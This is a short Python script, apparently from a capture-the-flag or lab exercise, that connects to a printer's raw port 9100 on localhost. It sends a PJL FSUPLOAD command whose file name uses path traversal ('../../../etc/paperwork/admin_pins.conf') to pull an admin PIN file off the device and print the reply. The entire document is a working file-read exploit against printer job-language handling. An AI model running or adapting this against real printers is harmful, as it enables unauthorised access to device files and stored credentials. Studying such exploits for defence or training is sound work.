#!/usr/bin/env python3
import socket, sys
path = sys.argv[1] if len(sys.argv) > 1 else "../../../etc/paperwork/admin_pins.conf"
sz = int(sys.argv[2]) if len(sys.argv) > 2 else 48
spec = f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={sz}\r\n'.encode()
s = socket.socket(); s.settimeout(8); s.connect(("127.0.0.1", 9100))
s.sendall(spec)
print(s.recv(4096))
s.close()